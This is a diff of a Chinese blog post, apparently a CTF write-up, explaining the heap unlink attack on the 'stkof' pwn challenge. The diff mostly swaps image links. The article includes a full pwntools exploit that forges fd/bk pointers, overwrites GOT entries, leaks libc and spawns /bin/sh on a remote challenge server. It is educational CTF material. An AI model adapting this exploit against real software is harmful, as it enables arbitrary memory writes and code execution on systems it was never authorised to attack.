@@ -68,26 +68,26 @@
 <meta property="og:site_name" content="Dusk的怪东西">
 <meta property="og:description" content="堆的unlink攻击手法，主要针对非tcache的bins">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240401121050312-1230752818.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240401121217273-1990311389.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406115835409-221853893.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406120146131-1075710854.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406120351157-261838151.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406120910537-1401599609.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406121659519-1304811550.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406122029514-906048417.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406122231594-1447785675.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406122658180-595155247.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406123735494-1798208285.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406124941736-176141043.png">
-<meta property="og:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406125131940-1270298385.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/ZxITifEDAvdHmkw.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/zJP2XiD64my9qc7.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/3QceFKBY1P68yZl.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/8FKqdvxcVNzB1pJ.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/h2cYwWZdBGlTi4O.png">
+<meta property="og:image" content="g:%5Cwebsite%5Cnew_reimu%5Creimu-template%5Csource_data%5Cunlink%5C3326078-20240406120910537-1401599609.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/kSTCQgKEcuyqRls.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/gadSqX2G9M4RYVp.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/sUANelVQynpHudc.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/mM9vytVlYx2kAcC.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/hm4kt6OQIypg7Jq.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/KQDGUZYHClXETAi.png">
+<meta property="og:image" content="https://s2.loli.net/2024/12/03/r7yj8ciZPL6SHbk.png">
 <meta property="article:published_time" content="2024-04-06T05:00:00.000Z">
-<meta property="article:modified_time" content="2024-11-29T13:05:21.169Z">
+<meta property="article:modified_time" content="2024-12-03T02:17:24.190Z">
 <meta property="article:author" content="Dusk">
 <meta property="article:tag" content="Pwn">
 <meta property="article:tag" content="Heap">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240401121050312-1230752818.png">
+<meta name="twitter:image" content="https://s2.loli.net/2024/12/03/ZxITifEDAvdHmkw.png">
   
   
     <link rel="alternate" href="/atom.xml" title="Dusk的怪东西" type="application/atom+xml">
@@ -243,7 +243,7 @@
       <div class="article-date">
   <a href="/2024/04/06/unlink(smallbins)/" class="article-date-link" data-aos="zoom-in">
     <time datetime="2024-04-06T05:00:00.000Z" itemprop="datePublished">2024-04-06</time>
-    <time style="display: none;" id="post-update-time">2024-11-29</time>
+    <time style="display: none;" id="post-update-time">2024-12-03</time>
   </a>
 </div>
 
@@ -268,11 +268,11 @@
 <p>unlink顾名思义，脱链，把一个空闲的chunk从unsorted bin里取出来，与物理相邻的chunk合成一个一个大堆块（分“前合”，“后合”’）。这里用图来解释会更清晰一些<br />
 原本的堆块结构是这样的，双向链表</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD = P-&gt;fd</span><br><span class="line">BK = P-&gt;bk</span><br></pre></td></tr></table></figure>
-<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240401121050312-1230752818.png" alt="image" /><br />
-在unlink经过一系列操作之后成了这样</p>
+<p><img src="https://s2.loli.net/2024/12/03/ZxITifEDAvdHmkw.png" alt="image" /></p>
+<p>在unlink经过一系列操作之后成了这样</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK</span><br><span class="line">BK-&gt;fd = FD</span><br></pre></td></tr></table></figure>
-<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240401121217273-1990311389.png" alt="image" /><br />
-我们可以很清楚的看到，BK-&gt;fd不再指向p-&gt;prev_size而是FD-&gt;prev_size，而FD-bk同理，指向了BK-&gt;prev_size，就把P给脱了出来，<strong>等待下一个被free的与它物理相邻的堆块，与其合并成新的堆块</strong>。比如P和FD都被free了，那么P和FD就会合成为新的堆块，chunk头就是P的首地址，而如果是BK和P合并的话，chunk头就是BK的首地址，所以<strong>前合与后合是不一样的</strong><br />
+<p><img src="https://s2.loli.net/2024/12/03/zJP2XiD64my9qc7.png" alt="image" /></p>
+<p>我们可以很清楚的看到，BK-&gt;fd不再指向p-&gt;prev_size而是FD-&gt;prev_size，而FD-bk同理，指向了BK-&gt;prev_size，就把P给脱了出来，<strong>等待下一个被free的与它物理相邻的堆块，与其合并成新的堆块</strong>。比如P和FD都被free了，那么P和FD就会合成为新的堆块，chunk头就是P的首地址，而如果是BK和P合并的话，chunk头就是BK的首地址，所以<strong>前合与后合是不一样的</strong><br />
 那么我们要是可以<strong>伪造fd和bk弄出了fake_chunk</strong>，是不是就可以<strong>进行任意地址读写</strong>了？</p>
 <h2 id="条件"><a class="markdownIt-Anchor" href="#条件"></a> 条件</h2>
 <p>想要利用这个漏洞，那么你就必须拥有修改被free掉的堆块的权限，即<strong>UAF漏洞</strong></p>
@@ -286,16 +286,16 @@
 <p>其<strong>最终效果就是往P里写入（P-0x18）的值</strong></p>
 <h1 id="例题stkof"><a class="markdownIt-Anchor" href="#例题stkof"></a> 例题(stkof)</h1>
 <h2 id="审视源码"><a class="markdownIt-Anchor" href="#审视源码"></a> 审视源码</h2>
-<p>main函数，可以看到是去符号表的，通过1,2,3,4来执行相应函数，类似于menu<br />
-<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406115835409-221853893.png" alt="image" /><br />
-首先看寻找下<code>malloc</code>在哪里，经查询，当<code>v3 == 1</code>时，该函数就是malloc<br />
-<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406120146131-1075710854.png" alt="image" /><br />
-有了malloc，后面的函数就更好对应了，那我们来看看<code>v3 == 2</code>是什么<br />
-<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406120351157-261838151.png" alt="image" /><br />
-可以看到，有两个输入，最开始会<strong>查询数组s中的v2存不存在</strong>，不存在就Fail，所以可以看做是<strong>index</strong>，而第二个输入比较复杂，先是把s字符串转为整形赋给n，ptr取s[v2]的内容，在for循环里逐字节对应，那么我们可以得到<code>n为size</code>，而<code>ptr为content</code>，那么这一整个函数就可以说是<code>edit</code><br />
-再看看<code>v3 == 3</code>，很明显是个free<br />
-<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406120910537-1401599609.png" alt="image" /><br />
-其实只要有这三个函数就足够了，剩下的那个函数就是个checkin，看看你写入没有，非必要就不展示了</p>
+<p>main函数，可以看到是去符号表的，通过1,2,3,4来执行相应函数，类似于menu</p>
+<p><img src="https://s2.loli.net/2024/12/03/3QceFKBY1P68yZl.png" alt="image" /></p>
+<p>首先看寻找下<code>malloc</code>在哪里，经查询，当<code>v3 == 1</code>时，该函数就是malloc</p>
+<p><img src="https://s2.loli.net/2024/12/03/8FKqdvxcVNzB1pJ.png" alt="image" /></p>
+<p>有了malloc，后面的函数就更好对应了，那我们来看看<code>v3 == 2</code>是什么</p>
+<p><img src="https://s2.loli.net/2024/12/03/h2cYwWZdBGlTi4O.png" alt="image" /></p>
+<p>可以看到，有两个输入，最开始会<strong>查询数组s中的v2存不存在</strong>，不存在就Fail，所以可以看做是<strong>index</strong>，而第二个输入比较复杂，先是把s字符串转为整形赋给n，ptr取s[v2]的内容，在for循环里逐字节对应，那么我们可以得到<code>n为size</code>，而<code>ptr为content</code>，那么这一整个函数就可以说是<code>edit</code><br />
+再看看<code>v3 == 3</code>，很明显是个free</p>
+<p><img src="G:%5Cwebsite%5Cnew_reimu%5Creimu-template%5Csource_data%5Cunlink%5C3326078-20240406120910537-1401599609.png" alt="image" /></p>
+<p>其实只要有这三个函数就足够了，剩下的那个函数就是个checkin，看看你写入没有，非必要就不展示了</p>
 <h2 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> Payload</h2>
 <p>可能是我ubuntu22.04版本有点高，本地调不通，所以我本来想很详细的写gdb调试过程的，但是却因为本地调不成功而远端可打，迫于无奈只能先把payload整个放出来，然后逐步解释</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#p = process(&#x27;./stkof&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25670</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stkof&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">P = <span class="number">0x602150</span></span><br><span class="line">FD = P - <span class="number">0x18</span></span><br><span class="line">BK = P - <span class="number">0x10</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x30</span>)</span><br><span class="line">malloc(<span class="number">0x30</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">payload += p64(FD) + p64(BK)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x40</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">payload_change = p64(<span class="number">0</span>)</span><br><span class="line">payload_change += p64(atoi_got)</span><br><span class="line">payload_change += p64(puts_got)</span><br><span class="line">payload_change += p64(free_got)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload_change),payload_change)</span><br><span class="line"></span><br><span class="line">payload_leak = p64(puts_plt)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload_leak),payload_leak)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_real_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_real_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_real_addr - <span class="number">0x6f690</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">log.success(<span class="string">&#x27;system_addr:&#x27;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x08</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
@@ -305,21 +305,21 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="number">0x30</span>)</span><br><span class="line">malloc(<span class="number">0x30</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line">malloc(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) </span><br><span class="line">payload += p64(FD) + p64(BK) <span class="comment">#跟选取的堆块有关</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> <span class="comment">#因为我开辟的堆块大小为0x30，为了覆盖到下一个堆块头，得先把这0x30填充完</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x40</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
 <p>我们一次来看edit之前，edit和free后的状况</p>
 <h3 id="edit前"><a class="markdownIt-Anchor" href="#edit前"></a> edit前</h3>
-<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406121659519-1304811550.png" alt="image" /><br />
-首先我们先排除三个堆块，分别为系统创造的size为0x290,0x1000,0x410（其实都比真实开辟的地址大0x10），其余的才是<strong>我们创造的堆块</strong>。<br />
+<p><img src="https://s2.loli.net/2024/12/03/kSTCQgKEcuyqRls.png" alt="image" /></p>
+<p>首先我们先排除三个堆块，分别为系统创造的size为0x290,0x1000,0x410（其实都比真实开辟的地址大0x10)，其余的才是<strong>我们创造的堆块</strong>。<br />
 我们可以看到最初的堆块构造</p>
 <h3 id="edit"><a class="markdownIt-Anchor" href="#edit"></a> edit</h3>
-<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406122029514-906048417.png" alt="image" /><br />
-现在我们已经把payload的内容写进去了，fd和bk也都伪造好了，不过在伪造fd,bk之前，得先确定堆块的位置，先来看看如何根据堆块的位置进行伪造fd,bk指针<br />
-<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406122231594-1447785675.png" alt="image" /><br />
-<strong>0x602140是数组s的首地址</strong>，也是我们堆所在的地方，我们可以很清楚的看到，因为我选取的是<code>堆块2</code>，对应的地址是<code>0x602150--&gt;0x1ed4700</code>，所以我的<code>P == 0x612150</code>，那么fd和bk也就应运而生</p>
+<p><img src="https://s2.loli.net/2024/12/03/gadSqX2G9M4RYVp.png" alt="image" /></p>
+<p>现在我们已经把payload的内容写进去了，fd和bk也都伪造好了，不过在伪造fd,bk之前，得先确定堆块的位置，先来看看如何根据堆块的位置进行伪造fd,bk指针</p>
+<p><img src="https://s2.loli.net/2024/12/03/sUANelVQynpHudc.png" alt="image" /></p>
+<p><strong>0x602140是数组s的首地址</strong>，也是我们堆所在的地方，我们可以很清楚的看到，因为我选取的是<code>堆块2</code>，对应的地址是<code>0x602150--&gt;0x1ed4700</code>，所以我的<code>P == 0x612150</code>，那么fd和bk也就应运而生</p>
 <h3 id="free"><a class="markdownIt-Anchor" href="#free"></a> free</h3>
-<p>从这里开始我的gdb就开始失败了，为了连贯我还是把它放出来<br />
-<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406122658180-595155247.png" alt="image" /><br />
-按照正常情况，我最开始的<strong>0x31应该会被修改成0xc1</strong>，而<strong>bk和fd也会被解析为真实地址</strong>，但是不知为何没有，应该是ubuntu版本问题。<br />
-如果正常运行的话，堆会变成这样<br />
-<img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406123735494-1798208285.png" alt="image" /><br />
-那么我们现在就可以进行任意地址写了<br />
+<p>从这里开始我的gdb就开始失败了，为了连贯我还是把它放出来</p>
+<p><img src="https://s2.loli.net/2024/12/03/mM9vytVlYx2kAcC.png" alt="image" /></p>
+<p>按照正常情况，我最开始的<strong>0x31应该会被修改成0xc1</strong>，而<strong>bk和fd也会被解析为真实地址</strong>，但是不知为何没有，应该是ubuntu版本问题。<br />
+如果正常运行的话，堆会变成这样</p>
+<p><img src="https://s2.loli.net/2024/12/03/hm4kt6OQIypg7Jq.png" alt="image" /></p>
+<p>那么我们现在就可以进行任意地址写了<br />
 PS:由于堆块2和3已经合并了，所以<strong>这里的chunk3实际是我开辟的第四个堆块</strong></p>
 <h2 id="修改chunk"><a class="markdownIt-Anchor" href="#修改chunk"></a> 修改chunk</h2>
 <h3 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h3>
@@ -327,16 +327,16 @@ PS:由于堆块2和3已经合并了，所以<strong>这里的chunk3实际是我�
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload_change = p64(<span class="number">0</span>) <span class="comment">#0x602138</span></span><br><span class="line">payload_change += p64(atoi_got) <span class="comment">#0x602140</span></span><br><span class="line">payload_change += p64(puts_got) <span class="comment">#0x602148</span></span><br><span class="line">payload_change += p64(free_got) <span class="comment">#0x602150</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload_change),payload_change) <span class="comment">#相当于从0x602138开始写入地址</span></span><br><span class="line"></span><br><span class="line">payload_leak = p64(puts_plt)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload_leak),payload_leak) <span class="comment">#泄露任意你想要的地址</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#puts对应所在堆块</span></span><br><span class="line"></span><br><span class="line">puts_real_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_real_addr:&#x27;</span>+<span class="built_in">hex</span>(puts_real_addr))</span><br></pre></td></tr></table></figure>
 <p><strong>我们要进行任意地址写，就必须从0x602138入手，也就是我们的堆块2入手</strong>，我们把got表填写进chunk之中，通过改写got表来实现任意操作。因为我们的程序中不存在system，所以我们得先泄露出libc_base才行，<strong>把free改成puts即可通过free任意地址打印出对应函数的真实地址</strong></p>
 <h3 id="first_edit"><a class="markdownIt-Anchor" href="#first_edit"></a> first_edit</h3>
-<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406124941736-176141043.png" alt="image" /></p>
+<p><img src="https://s2.loli.net/2024/12/03/KQDGUZYHClXETAi.png" alt="image" /></p>
 <h3 id="second_edit"><a class="markdownIt-Anchor" href="#second_edit"></a> second_edit</h3>
-<p><img src="https://img2024.cnblogs.com/blog/3326078/202404/3326078-20240406125131940-1270298385.png" alt="image" /></p>
+<p><img src="https://s2.loli.net/2024/12/03/r7yj8ciZPL6SHbk.png" alt="image" /></p>
 <h3 id="泄露"><a class="markdownIt-Anchor" href="#泄露"></a> 泄露</h3>
 <p>我们已经<strong>把free_got指向了puts</strong>，那么我们<strong>free任意堆块都相当于puts出了它的真实地址</strong>，只需要接收地址即可，因为2我泄露的是puts函数，puts函数是在堆块1内，所以我是free(1)</p>
 <h3 id="收尾"><a class="markdownIt-Anchor" href="#收尾"></a> 收尾</h3>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">libc_base = puts_real_addr - <span class="number">0x6f690</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + <span class="number">0x45390</span></span><br><span class="line">log.success(<span class="string">&#x27;system_addr:&#x27;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x08</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x20</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p><strong>把free再次改成system</strong>，然后往空堆块里塞<code>/bin/sh</code>再free即可</p>
 <h2 id="注意"><a class="markdownIt-Anchor" href="#注意"></a> 注意</h2>
-<p>这个适用的是类似small_bins和large_bins，不适用于tcache</p>
+<p>当时写这个blog的时候是Ubuntu22.04且还不熟悉bins的结构和tcache的异或，所以前边写的有些怪，<s>时间太长懒得改了</s>。这个适用的是类似small_bins和large_bins，不适用于tcache</p>
 
       
     </div>
@@ -361,7 +361,7 @@ PS:由于堆块2和3已经合并了，所以<strong>这里的chunk3实际是我�
         
           
           
-            <img data-src="https://s2.loli.net/2024/11/29/xLbMZ46hdDnBR7I.png" data-sizes="auto" alt="格式化字符串漏洞利用fini_array及其拓展应用" class="lazyload">
+            <img data-src="https://s2.loli.net/2024/12/02/UczMCeh2ZYKnlDq.png" data-sizes="auto" alt="格式化字符串漏洞利用fini_array及其拓展应用" class="lazyload">
           
         
         <a href="/2024/04/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8fini_array%E5%8F%8A%E5%85%B6%E6%8B%93%E5%B1%95/"></a>
@@ -378,7 +378,7 @@ PS:由于堆块2和3已经合并了，所以<strong>这里的chunk3实际是我�
       
         
         
-          <img data-src="https://s2.loli.net/2024/11/29/BWUfxhRNo2eOdq5.png" data-sizes="auto" alt="ORW" class="lazyload">
+          <img data-src="https://s2.loli.net/2024/12/02/u9D7JI4F1TZHOqB.jpg" data-sizes="auto" alt="ORW" class="lazyload">
         
       
       <a href="/2024/03/29/orw/"></a>
